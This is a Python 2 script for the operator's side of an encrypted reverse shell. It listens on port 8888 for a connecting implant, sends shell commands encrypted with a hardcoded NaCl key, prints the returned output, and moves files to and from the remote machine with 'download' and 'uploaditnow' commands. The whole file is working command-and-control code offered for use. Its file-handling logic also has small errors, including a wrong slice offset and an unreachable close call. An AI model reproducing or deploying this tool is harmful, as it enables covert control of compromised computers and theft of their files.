#!/usr/bin/python2.7
import socket,os
import sys
import nacl.secret
import nacl.utils
import time,os

HOST = '0.0.0.0'   # Symbolic name, meaning all available interfaces
PORT = 8888 # Arbitrary non-privileged port

# This must be kept secret, this is the combination to your safe
key = '9SeT2kaxYlRYS675TxzHwB2el4Pa15A3'

# This is your safe, you can use it to encrypt or decrypt messages
box = nacl.secret.SecretBox(key)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Socket created'

#Bind socket to local host and port
try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()

print 'Socket bind complete'

#Start listening on socket
s.listen(10)
print 'Socket now listening'
conn, addr = s.accept()
print 'Connected with ' + addr[0] + ':' + str(addr[1])

#now keep talking with the client
while 1:
    # receive encrypted data
    data = conn.recv(1024)
    # decrypt the data
    datadec = box.decrypt(data)

    if datadec.endswith("EOFEOFEOFEOFEOFX") == True:
            #print the output
            print datadec[:-16]
            #get next command
            nextcmd = raw_input("[shell]: ")
            #encrypt the input
            nextcmdEnc = box.encrypt(nextcmd)
            #send dat sh!t
            conn.send(nextcmdEnc)

            #download file
            if nextcmd.startswith("download") == True:
                fileName = nextcmd[9:]

                f = open(fileName, 'wb')
                print 'Download in progress... ' + fileName

                #start downloading the damn file
                while True:
                        r = conn.recv(1024)
                        while(r):
                                if r.endswith("EOFEOFEOFEOFEOFX"):
                                    u = r[:-16]
                                    f.write(u)
                                    break
                                else:
                                    f.write(r)
                                    r = conn.recv(1024)
                        break
                        #close the file
                        f.close()

            if nextcmd.startswith("uploaditnow") == True:

            			# file name
            			upFile = nextcmd[7:]

            			# open file
            			g = open(upFile, 'rb')
            			print 'Uploading in progress... ' + upFile


            			# uploading
            			while 1:
            				fileData = g.read()
            				if not fileData: break
            				# begin sending file
            				conn.sendall(fileData)
            			g.close()
            			time.sleep(0.8)

            			conn.sendall('EOFEOFEOFEOFEOFX')
            			time.sleep(0.8)



    # else, just print
    else:
    	   print datadec
